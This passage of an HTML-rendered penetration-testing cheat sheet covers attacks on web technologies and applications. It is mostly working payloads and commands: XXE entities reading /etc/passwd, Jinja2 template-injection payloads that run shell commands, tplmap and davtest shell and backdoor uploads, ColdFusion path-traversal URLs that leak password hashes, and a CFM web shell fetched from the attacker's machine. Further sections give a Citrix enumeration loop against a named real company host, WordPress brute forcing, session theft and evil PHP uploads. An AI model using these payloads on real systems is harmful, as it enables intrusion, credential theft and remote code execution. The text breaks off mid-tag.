aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> XSS </h5> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Try first --&gt;</span>
<span class="cp">&lt;![CDATA[&lt;script&gt;alert('xss')&lt;/script&gt;]]&gt;</span>
<span class="c">&lt;!-- CDATA is not parsed by XML --&gt;</span>
<span class="c">&lt;!-- Alternate --&gt;</span>
<span class="cp">&lt;![CDATA[&lt;]]&gt;</span>script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>alert('xss')<span class="cp">&lt;![CDATA[&lt;]]&gt;</span>/script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span></code></pre></div></div> <h5 id="web--technologies--xml--injection--xxe"> <a href="#web--technologies--xml--injection--xxe" class="anchor-heading" aria-labelledby="web--technologies--xml--injection--xxe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> XXE </h5> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- "url" can be
     - a standard URL
     - file:///&lt;full-path&gt; - Dir trav
     - PHP wrapper (expect://&lt;rce&gt;)
     - Java/other implementation  --&gt;</span>
<span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "&lt;url&gt;</span>"&gt;]&gt;
<span class="nt">&lt;test&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/test&gt;</span>

<span class="c">&lt;!-- Alternative with ELEMENT --&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>

<span class="c">&lt;!-- Note that Dir traversal may
     break the XML depending on the
     content of the file
     Encode it to bypass this     --&gt;</span>
<span class="cp">&lt;!DOCTYPE a [&lt;!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=&lt;rel-path&gt;</span>"&gt;]&gt;
<span class="nt">&lt;title&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/title&gt;</span></code></pre></div></div> <h4 id="web--technologies--xml--xpath-injection"> <a href="#web--technologies--xml--xpath-injection" class="anchor-heading" aria-labelledby="web--technologies--xml--xpath-injection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> XPath Injection </h4> <h5 id="web--technologies--xml--xpath-injection--xcat"> <a href="#web--technologies--xml--xpath-injection--xcat" class="anchor-heading" aria-labelledby="web--technologies--xml--xpath-injection--xcat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> XCat </h5> <ul> <li><a href="https://github.com/orf/xcat">Repo</a> - XPath injection tool - <a href="https://xcat.readthedocs.io">docs</a><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xcat detect <span class="s1">'&lt;url&gt;'</span> &lt;param&gt; <span class="s2">"&lt;param&gt;=&lt;val&gt;"</span> <span class="nt">--true-string</span><span class="o">=</span><span class="s2">"&lt;non-error-str&gt;"</span> <span class="nt">--fast</span> <span class="nt">--concurrency</span><span class="o">=</span>&lt;n&gt; <span class="nt">-h</span> &lt;file.h&gt; <span class="nt">--encode</span><span class="o">=</span>form <span class="nt">-m</span> POST
<span class="c"># Change 'detect' to 'run' or 'shell'</span></code></pre></div></div></li> </ul> <h3 id="web--technologies--webdav"> <a href="#web--technologies--webdav" class="anchor-heading" aria-labelledby="web--technologies--webdav"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> WebDAV </h3> <h4 id="web--technologies--webdav--notes"> <a href="#web--technologies--webdav--notes" class="anchor-heading" aria-labelledby="web--technologies--webdav--notes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Notes </h4> <ul> <li>When uploading files, some formats/extensions may not be allowed (check with <code>davtest</code>), but there may be no issue in uploading them as .txt and then renaming them (use <code>cadaver</code>)</li> </ul> <h4 id="web--technologies--webdav--davtest"> <a href="#web--technologies--webdav--davtest" class="anchor-heading" aria-labelledby="web--technologies--webdav--davtest"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> davtest </h4> <ul> <li><a href="https://github.com/cldrn/davtest">Site</a> - <a href="https://gitlab.com/kalilinux/packages/davtest">Kali-Site</a> - Exploit DAV<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Perform check and clean afterwards</span>
davtest <span class="nt">-url</span> &lt;url&gt; <span class="nt">-cleanup</span>
<span class="c"># -auth &lt;user:pass&gt; | -realm &lt;realm&gt;</span>

<span class="c"># Upload backdoor (improved-version)</span>
davtest <span class="nt">-url</span> &lt;url&gt; <span class="nt">-sendbd</span> auto
<span class="c"># See backdoor folder for valid ext</span>
<span class="c"># Non-random name: -random &lt;name&gt;</span>

<span class="c"># Upload file</span>
davtest <span class="nt">-url</span> &lt;url&gt; <span class="nt">-uploadfile</span> &lt;file&gt; <span class="nt">-uploadloc</span> &lt;destination&gt;
<span class="c"># Create dirs: -directory &lt;dir&gt;</span></code></pre></div></div></li> </ul> <h4 id="web--technologies--webdav--cadaver"> <a href="#web--technologies--webdav--cadaver" class="anchor-heading" aria-labelledby="web--technologies--webdav--cadaver"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Cadaver </h4> <ul> <li><a href="http://webdav.org/cadaver/">Site</a> - WebDAV FTP-like tool<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -t to operate on non-DAV paths</span>
cadaver &lt;url&gt;
<span class="c"># ls | cd | pwd | get | put | delete</span></code></pre></div></div></li> </ul> <h3 id="web--technologies--lua"> <a href="#web--technologies--lua" class="anchor-heading" aria-labelledby="web--technologies--lua"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> LUA </h3> <h4 id="web--technologies--lua--decompilation"> <a href="#web--technologies--lua--decompilation" class="anchor-heading" aria-labelledby="web--technologies--lua--decompilation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Decompilation </h4> <h5 id="web--technologies--lua--decompilation--general"> <a href="#web--technologies--lua--decompilation--general" class="anchor-heading" aria-labelledby="web--technologies--lua--decompilation--general"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> General </h5> <ul> <li>Use <code>file</code> to figure out the version</li> <li>Get a decompiler from <a href="https://lua-users.org/">lua-users</a></li> </ul> <h5 id="web--technologies--lua--decompilation--luadec"> <a href="#web--technologies--lua--decompilation--luadec" class="anchor-heading" aria-labelledby="web--technologies--lua--decompilation--luadec"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> luadec </h5> <ul> <li><a href="http://files.luaforge.net/releases/luadec/luadec">Site</a> - LUA 5.0 decompiler</li> <li>To fix compilation issues run:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-l</span> <span class="nt">-r</span> getline | xargs <span class="nt">-n1</span> <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/getline(/ld_&amp;/g'</span></code></pre></div></div></li> </ul> <h5 id="web--technologies--lua--decompilation--unluac"> <a href="#web--technologies--lua--decompilation--unluac" class="anchor-heading" aria-labelledby="web--technologies--lua--decompilation--unluac"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> unluac </h5> <ul> <li><a href="https://sourceforge.net/projects/unluac/">Site</a> - LUA 5.1+</li> <li>Custom <a href="https://sourceforge.net/p/unluac/discussion/general/thread/402225f086/">opmaps</a> might be required <ul> <li>Use the <code>--opmap &lt;op-file&gt;</code></li> </ul> </li> </ul> <h3 id="web--technologies--template-engines"> <a href="#web--technologies--template-engines" class="anchor-heading" aria-labelledby="web--technologies--template-engines"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Template Engines </h3> <h4 id="web--technologies--template-engines--manual"> <a href="#web--technologies--template-engines--manual" class="anchor-heading" aria-labelledby="web--technologies--template-engines--manual"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Manual </h4> <h5 id="web--technologies--template-engines--manual--detection"> <a href="#web--technologies--template-engines--manual--detection" class="anchor-heading" aria-labelledby="web--technologies--template-engines--manual--detection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Detection </h5> <ul> <li>Find GET, POST or URL path that react to user input</li> <li>Success operation payloads<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{7*7}}
${7*7}
&lt;%= 7*7 %&gt;
${{7*7}}
#{7*7}
@(7*7)</code></pre></div></div></li> <li>Error payloads -&gt; Detect engine<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${{&lt;%[%'"}}%\
${}
{{}}
@()
&lt;%= %&gt;
${7/0}
{{7/0}}
&lt;%= 7/0 %&gt;
@(7/0)
``</code></pre></div></div></li> </ul> <h4 id="web--technologies--template-engines--cheatsheets"> <a href="#web--technologies--template-engines--cheatsheets" class="anchor-heading" aria-labelledby="web--technologies--template-engines--cheatsheets"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Cheatsheets </h4> <ul> <li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks</a></li> <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadAllTheThings</a></li> </ul> <h4 id="web--technologies--template-engines--flask---jinja2"> <a href="#web--technologies--template-engines--flask---jinja2" class="anchor-heading" aria-labelledby="web--technologies--template-engines--flask---jinja2"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Flask / Jinja2 </h4> <ul> <li>RCE<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Bypass most common filters: '.',
# '_','|join','[',']','mro','base'
</span>{{<span class="n">request</span>|<span class="n">attr</span>(<span class="s1">'application'</span>)|<span class="n">attr</span>(<span class="s1">'\x5f\x5fglobals\x5f\x5f'</span>)|<span class="n">attr</span>(<span class="s1">'\x5f\x5fgetitem\x5f\x5f'</span>)(<span class="s1">'\x5f\x5fbuiltins\x5f\x5f'</span>)|<span class="n">attr</span>(<span class="s1">'\x5f\x5fgetitem\x5f\x5f'</span>)(<span class="s1">'\x5f\x5fimport\x5f\x5f'</span>)(<span class="s1">'os'</span>)|<span class="n">attr</span>(<span class="s1">'popen'</span>)(<span class="s1">'&lt;cmd&gt;'</span>)|<span class="n">attr</span>(<span class="s1">'read'</span>)()}}

<span class="c"># Shortest payloads
</span>{{ <span class="n">cycler</span>.<span class="err">__</span><span class="n">init__</span>.<span class="err">__</span><span class="n">globals__</span>.<span class="n">os</span>.<span class="n">popen</span>(<span class="s1">'&lt;cmd&gt;'</span>).<span class="n">read</span>() }}

{{ <span class="n">joiner</span>.<span class="err">__</span><span class="n">init__</span>.<span class="err">__</span><span class="n">globals__</span>.<span class="n">os</span>.<span class="n">popen</span>(<span class="s1">'&lt;cmd&gt;'</span>).<span class="n">read</span>() }}

{{ <span class="n">namespace</span>.<span class="err">__</span><span class="n">init__</span>.<span class="err">__</span><span class="n">globals__</span>.<span class="n">os</span>.<span class="n">popen</span>(<span class="s1">'&lt;cmd&gt;'</span>).<span class="n">read</span>() }}</code></pre></div></div></li> </ul> <h4 id="web--technologies--template-engines--tplmap"> <a href="#web--technologies--template-engines--tplmap" class="anchor-heading" aria-labelledby="web--technologies--template-engines--tplmap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tplmap </h4> <ul> <li><a href="https://github.com/epinna/tplmap">Site</a> - SSTI detect &amp; exploit tool<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Detect if 'name' is injectable</span>
tplmap.py <span class="nt">-u</span> <span class="s1">'http://&lt;ip&gt;/page?name=John'</span>

<span class="c"># Detect if the path is injectable</span>
tplmap.py <span class="nt">-u</span> <span class="s1">'http://&lt;ip&gt;/*'</span>

<span class="c"># Run a shell</span>
tplmap.py <span class="nt">--os-shell</span> <span class="nt">-u</span> <span class="s1">'http://&lt;ip&gt;/page?name=John'</span></code></pre></div></div></li> </ul> <h2 id="web--apps"> <a href="#web--apps" class="anchor-heading" aria-labelledby="web--apps"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Apps </h2> <h3 id="web--apps--adobe-coldfusion"> <a href="#web--apps--adobe-coldfusion" class="anchor-heading" aria-labelledby="web--apps--adobe-coldfusion"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Adobe ColdFusion </h3> <h4 id="web--apps--adobe-coldfusion--windows"> <a href="#web--apps--adobe-coldfusion--windows" class="anchor-heading" aria-labelledby="web--apps--adobe-coldfusion--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h4> <ul> <li>From <a href="https://nets.ec/Coldfusion_hacking">here</a></li> <li>Find the version in the image of the admin login: <code>http://&lt;ip&gt;/CFIDE/administrator</code></li> </ul> <h5 id="web--apps--adobe-coldfusion--windows--administration-login-bypass"> <a href="#web--apps--adobe-coldfusion--windows--administration-login-bypass" class="anchor-heading" aria-labelledby="web--apps--adobe-coldfusion--windows--administration-login-bypass"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Administration Login Bypass </h5> <ul> <li><code>http://&lt;ip&gt;/CFIDE/administrator/enter.cfm</code> needs to be accessible, try HTTPS if not</li> <li>Use LFD for showing the passwords hashes:<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ColdFusion 6
</span><span class="n">http</span>://&lt;<span class="n">ip</span>&gt;/<span class="n">CFIDE</span>/<span class="n">administrator</span>/<span class="n">enter</span>.<span class="n">cfm</span>?<span class="n">locale</span>=..\..\..\..\..\..\..\..\<span class="n">CFusionMX</span>\<span class="n">lib</span>\<span class="n">password</span>.<span class="n">properties</span>%<span class="m">00</span><span class="n">en</span>

<span class="c"># ColdFusion 7
</span><span class="n">http</span>://&lt;<span class="n">ip</span>&gt;/<span class="n">CFIDE</span>/<span class="n">administrator</span>/<span class="n">enter</span>.<span class="n">cfm</span>?<span class="n">locale</span>=..\..\..\..\..\..\..\..\<span class="n">CFusionMX7</span>\<span class="n">lib</span>\<span class="n">password</span>.<span class="n">properties</span>%<span class="m">00</span><span class="n">en</span>

<span class="c"># ColdFusion 8
</span><span class="n">http</span>://&lt;<span class="n">ip</span>&gt;/<span class="n">CFIDE</span>/<span class="n">administrator</span>/<span class="n">enter</span>.<span class="n">cfm</span>?<span class="n">locale</span>=..\..\..\..\..\..\..\..\<span class="n">ColdFusion8</span>\<span class="n">lib</span>\<span class="n">password</span>.<span class="n">properties</span>%<span class="m">00</span><span class="n">en</span>

<span class="c"># Other versions
</span><span class="n">http</span>://&lt;<span class="n">ip</span>&gt;/<span class="n">CFIDE</span>/<span class="n">administrator</span>/<span class="n">enter</span>.<span class="n">cfm</span>?<span class="n">locale</span>=..\..\..\..\..\..\..\..\<span class="n">JRun4</span>\<span class="n">servers</span>\<span class="n">cfusion</span>\<span class="n">cfusion</span>-<span class="n">ear</span>\<span class="n">cfusion</span>-<span class="n">war</span>\<span class="n">WEB</span>-<span class="n">INF</span>\<span class="n">cfusion</span>\<span class="n">lib</span>\<span class="n">password</span>.<span class="n">properties</span>%<span class="m">00</span><span class="n">en</span></code></pre></div></div></li> <li>On the console, run the following JavaScript to get the HMAC hash:<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">hex_hmac_sha1</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">loginform</span><span class="p">.</span><span class="nx">salt</span><span class="p">.</span><span class="nx">value</span><span class="p">,</span><span class="dl">"</span><span class="s2">&lt;LFD-password-field&gt;</span><span class="dl">"</span><span class="p">)</span></code></pre></div></div></li> <li>Start a mitm HTTP proxy for tampering the request when submitting the login form</li> <li>Note that the user field should be <code>admin</code> and the password field empty when sending the request</li> <li>On the tamperer, set the empty <code>cfadminPassword</code> field to the HMAC hash obtained before</li> <li>Note that the login page reloads every 30 seconds to renew the salt, so you&#8217;ll have to repeat the console step to get the new HMAC hash</li> <li>On the tamperer, the request shall include in a field the salt and this only seem to happen when sending the empty password</li> </ul> <h5 id="web--apps--adobe-coldfusion--windows--uploading-an-evil-file"> <a href="#web--apps--adobe-coldfusion--windows--uploading-an-evil-file" class="anchor-heading" aria-labelledby="web--apps--adobe-coldfusion--windows--uploading-an-evil-file"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Uploading an evil file </h5> <ul> <li>Get the currently executed path by going to the <code>Server Settings &gt; Mappings</code> section in the left tab and noting the <code>CFIDE</code> local path (or any other that can be accessible from the web)</li> <li>Go to <code>Debugging and Logging &gt; Scheduled Tasks</code> and create a new task <ul> <li>Set the name (anything works)</li> <li>Set the URL to your machine IP:PORT serving an evil <a href="https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/CFM/shell.cfm.html">cfm shell</a> with <code>.txt</code> extension</li> <li>Check <code>Output to file</code></li> <li>Set the file path to the local <code>CFIDE</code> path (or any other accessible) + any name for the file (that doesn&#8217;t include <code>-</code> or any symbol) with <code>.cfm</code> extension</li> <li>Save the task</li> </ul> </li> <li>Run the task</li> <li>If it fails it may be due to firewall rules (<a href="https://nets.ec/Coldfusion_hacking#Issues_2">workaround</a>), bad permissions to write to the path, tasks permissions (check the appropriate tabs) or anything related to the filename</li> </ul> <h5 id="web--apps--adobe-coldfusion--windows--playing-with-the-cfm-shell"> <a href="#web--apps--adobe-coldfusion--windows--playing-with-the-cfm-shell" class="anchor-heading" aria-labelledby="web--apps--adobe-coldfusion--windows--playing-with-the-cfm-shell"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Playing with the CFM shell </h5> <ul> <li>First try to execute the suggested cmd command with a <code>dir</code></li> <li>If it fails, try using only <code>cmd</code> in the <b>Command</b> field and <code>/c &lt;command&gt;</code> in the <b>Options</b> field</li> <li>When uploading a file (like <code>nc.exe</code>) locate it using <code>cmd /c dir /s /a C:\*nc.exe</code> and increase the <b>Timeout</b></li> <li>Finally, execute <code>nc</code> using the <code>cmd /c</code> to avoid possible issues regarding the <b>Timeout</b> value</li> </ul> <h3 id="web--apps--webmin"> <a href="#web--apps--webmin" class="anchor-heading" aria-labelledby="web--apps--webmin"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Webmin </h3> <h4 id="web--apps--webmin--information"> <a href="#web--apps--webmin--information" class="anchor-heading" aria-labelledby="web--apps--webmin--information"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Information </h4> <ul> <li>Can perform tasks equivalent to root</li> <li>Its access password is usually root&#8217;s</li> <li><b>IMPORTANT</b>: There&#8217;s a limit for attempting to login before locking (either permanently or temporarily)!!</li> </ul> <h4 id="web--apps--webmin--shellshock---cve-2014-6271"> <a href="#web--apps--webmin--shellshock---cve-2014-6271" class="anchor-heading" aria-labelledby="web--apps--webmin--shellshock---cve-2014-6271"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Shellshock - CVE-2014-6271 </h4> <ul> <li>Webmin uses CGI for login at: <code>/session_login.cgi</code></li> <li>Use <code>() { :; };sleep 10</code> in the User-Agent to check for it</li> <li>See the <a href="*Shellshock">Shellshock</a> section</li> </ul> <h4 id="web--apps--webmin--privesc"> <a href="#web--apps--webmin--privesc" class="anchor-heading" aria-labelledby="web--apps--webmin--privesc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PrivEsc </h4> <ul> <li>Create a new task with a reverse shell</li> </ul> <h3 id="web--apps--citrix"> <a href="#web--apps--citrix" class="anchor-heading" aria-labelledby="web--apps--citrix"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Citrix </h3> <h4 id="web--apps--citrix--login-schema-enumeration"> <a href="#web--apps--citrix--login-schema-enumeration" class="anchor-heading" aria-labelledby="web--apps--citrix--login-schema-enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Login Schema Enumeration </h4> <ul> <li>Find the default <code>StateContext</code> by intercepting a login attempt, changing it to an invalid value and checking the value of <code>StateContext</code> in the response</li> <li>Used for downgrading login (<a href="https://carlstalhood.com/page/29/?cat=-1#loginschema">schemas ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read </span>l<span class="p">;</span> <span class="k">do </span><span class="nv">sc</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"loginschema=</span><span class="nv">$l</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-w0</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">--data-urlencode</span> <span class="s2">"StateContext=</span><span class="nv">$sc</span><span class="s2">"</span> <span class="s1">'https://remote.axa.be/nf/auth/doAuthentication.do'</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s1">'bG9naW5zY2hlbWE9ZGVmYXVsdA=='</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$l</span><span class="s2"> - </span><span class="nv">$sc</span><span class="s2">"</span><span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="k">done</span> <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
CheckBox
ClientCertDualAuthDeviceID
ClientCertSingleAuthDeviceID
DeviceID_Cert
DomainDropdown
DualAuth
DualAuth_Flipped
DualAuthDeviceID
OntyDeviceID
OnlyDomainDropdown
OnlyOAuthToken
OnlyPassword
OnlyUsername
PrefilUserFromExpr
SingleAuthCaptcha
SingleAuthDeviceID
EOF</span></code></pre></div></div></li> <li>Intercept a login attempt and replace the <code>StateContext</code> base64 value</li> </ul> <h3 id="web--apps--salesforce"> <a href="#web--apps--salesforce" class="anchor-heading" aria-labelledby="web--apps--salesforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Salesforce </h3> <h4 id="web--apps--salesforce--endpoint-enumeration"> <a href="#web--apps--salesforce--endpoint-enumeration" class="anchor-heading" aria-labelledby="web--apps--salesforce--endpoint-enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Endpoint Enumeration </h4> <ul> <li><a href="https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae">Guide</a></li> <li>Search for this in the Proxy history: <ul> <li>/s/sfsites/aura - URL</li> <li>/sfsites/aura - URL</li> <li>/aura - URL</li> <li>aura.ApexAction.execute - GET param</li> <li>message - POST param</li> <li>aura.context - POST param</li> <li>aura%3a%2f%2f - Encoded param</li> <li>apex%3a%2f%2f - Encoded param</li> </ul> </li> <li>Grep in <code>app.js</code> or <code>aura_prod.js</code> for <ul> <li><code>componentService.initControllerDefs([{</code></li> </ul> </li> </ul> <h4 id="web--apps--salesforce--endpoint-interaction"> <a href="#web--apps--salesforce--endpoint-interaction" class="anchor-heading" aria-labelledby="web--apps--salesforce--endpoint-interaction"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Endpoint Interaction </h4> <ul> <li>Better use an existing POST to aura as template as it might require additional params like <code>aura.context</code> or <code>aura.token</code></li> <li>URL-decode <code>message</code> and replace the: <ul> <li><i>&#8220;descriptor&#8221;:</i> &lt;controller&gt;</li> <li><i>&#8220;classname&#8221;:</i> &lt;apex-class&gt;</li> <li><i>&#8220;method&#8221;:</i> &lt;class-method&gt;</li> <li><i>&#8220;params&#8221;:{</i> &lt;params&gt; <i>}</i></li> </ul> </li> <li>Only <a href="https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_interface_System_Callable.htm#apex_interface_System_Callable">Callable Apex Classes</a> can be invoked this way</li> </ul> <h3 id="web--apps--cms"> <a href="#web--apps--cms" class="anchor-heading" aria-labelledby="web--apps--cms"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CMS </h3> <h4 id="web--apps--cms--wordpress"> <a href="#web--apps--cms--wordpress" class="anchor-heading" aria-labelledby="web--apps--cms--wordpress"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Wordpress </h4> <h5 id="web--apps--cms--wordpress--wpscan"> <a href="#web--apps--cms--wordpress--wpscan" class="anchor-heading" aria-labelledby="web--apps--cms--wordpress--wpscan"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> WPScan </h5> <ul> <li><a href="https://github.com/wpscanteam/wpscan">Site</a> - WP/Plugin/Site enumeration:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Update Plugin DB</span>
wpscan <span class="nt">--update</span>

<span class="c"># Complete vuln scan &amp; User-enum</span>
wpscan <span class="nt">--url</span> &lt;url&gt; <span class="nt">--api-token</span> &lt;<span class="nb">id</span><span class="o">&gt;</span>
<span class="c"># Get the token in wpscan.com</span>
<span class="c"># Set if WP URI is non-default:</span>
<span class="c"># --wp-content-dir|--wp-plugins-dir</span>
<span class="c"># --force - Force scanning site</span>
<span class="c"># --random-user-agent - WAF bypass</span>
<span class="c"># --proxy - Run through proxy</span>
<span class="c"># Just use the WP/Plugin versions</span>
<span class="c"># in searchsploit, ignore the links</span>

<span class="c"># Pass bruteforce</span>
wpscan <span class="nt">--url</span> &lt;url&gt; <span class="nt">-e</span> u <span class="nt">--passwords</span> &lt;wordlist&gt;

<span class="c"># Enumerate all plugins/themes</span>
wpscan <span class="nt">--url</span> &lt;url&gt; <span class="nt">-e</span> at,ap <span class="nt">--api-token</span> &lt;<span class="nb">id</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h5 id="web--apps--cms--wordpress--privilege-escalation"> <a href="#web--apps--cms--wordpress--privilege-escalation" class="anchor-heading" aria-labelledby="web--apps--cms--wordpress--privilege-escalation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Privilege Escalation </h5> <h6 id="web--apps--cms--wordpress--privilege-escalation--database"> <a href="#web--apps--cms--wordpress--privilege-escalation--database" class="anchor-heading" aria-labelledby="web--apps--cms--wordpress--privilege-escalation--database"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Database</h6 id="web--apps--cms--wordpress--privilege-escalation--database--notes">Notes <ul> <li>These steps are to be performed if PHPmyadmin or a SQLi give DB access</li> </ul id="web--apps--cms--wordpress--privilege-escalation--database--steal-session">Steal Session <ul> <li>Find the active sessions in the table <code>wp_usermeta</code> looking at the columns: <ul> <li><code>meta_key = session_tokens</code></li> </ul> </li> <li>Check that the <code>user_id</code> of the session corresponds to one with admin privileges (see below how)</li> </ul id="web--apps--cms--wordpress--privilege-escalation--database--modify-admin-password">Modify Admin Password <ul> <li>Find the <code>user_id</code> of the admin in the table <code>wp_usermeta</code> looking at the columns: <ul> <li><code>user_id</code></li> <li><code>meta_key = wp_capabilities</code></li> <li><code>meta_value LIKE administrator</code></li> </ul> </li> <li>Find the username corresponding to the <code>user_id</code> in the <code>wp_users</code> table: <ul> <li><code>ID</code> should corresponds to <code>user_id</code></li> <li>Check <code>user_login</code> &amp; <code>user_nicename</code></li> </ul> </li> <li>Modify the <code>user_pass</code> value to one generated with the same hash</li> <li>Use <code>Name-That-Hash</code> for hash id</li> <li>If <code>phpass</code> type, use <code>openssl</code> to generate a new password:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># phpass is salted MD5</span>
openssl passwd <span class="nt">-1</span> <span class="s1">'&lt;password&gt;'</span>
<span class="c"># -salt &lt;salt&gt; - Use salt value</span></code></pre></div></div></li> </ul> </h6> <h6 id="web--apps--cms--wordpress--privilege-escalation--uploads"> <a href="#web--apps--cms--wordpress--privilege-escalation--uploads" class="anchor-heading" aria-labelledby="web--apps--cms--wordpress--privilege-escalation--uploads"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Uploads </h6> <ul> <li>Create an evil PHP file with the format: <code>&lt;?php &lt;payload&gt;; ?&gt;</code></li> <li>Find any upload point (media/plugins/themes) and select the <code>evil.php</code> (not zipped) as file</li> <li>Even if it fails, try to find it under: <ul> <li><code>/wp-content/uploads/evil.php</code></li> <li>or <code>/uploads/evil.php</code></li> </ul> </li> </ul> <h6 id="web--apps--cms--wordpress--privilege-escalation--plugins"> <a href="#web--apps--cms--wordpress--privilege-escalation--plugins" class="anchor-heading" aria-labelledby="web--apps--cms--wordpress--privilege-escalation--plugins"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Plugins </h6> <ul> <li>Evil plugin content:<div class="language-c 